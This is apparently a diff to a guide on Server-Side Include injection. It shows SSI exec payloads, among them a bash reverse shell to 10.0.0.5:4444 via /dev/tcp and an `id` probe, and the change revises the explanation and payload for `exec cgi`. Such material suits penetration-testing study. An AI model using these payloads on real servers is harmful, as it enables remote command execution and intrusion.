@@ -61,11 +61,11 @@ A reflected `uid=33(www-data) gid=33(www-data)` confirms both execution and the 
 <!--#exec cmd="/bin/sh -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'"-->
 ```
 
-Quote handling matters when the injection point already sits inside an HTML attribute or when the application strips characters. Swap outer and inner quotes as needed, and fall back to `exec cgi` if `cmd` is disabled but CGI execution is not:
+Quote handling matters when the injection point already sits inside an HTML attribute or when the application strips characters. Swap outer and inner quotes as needed, and fall back to `exec cgi`, which runs a CGI program addressed by its URL path, if `cmd` is disabled but CGI execution is not. It invokes an existing CGI endpoint rather than an arbitrary binary, so it is useful where a reachable script runs attacker-influenced input:
 
 ```
 <!--#exec cmd='id'-->
-<!--#exec cgi="/cgi-bin/../../../../bin/cat"-->
+<!--#exec cgi="/cgi-bin/debug.cgi"-->
 ```
 
 ## Blind execution
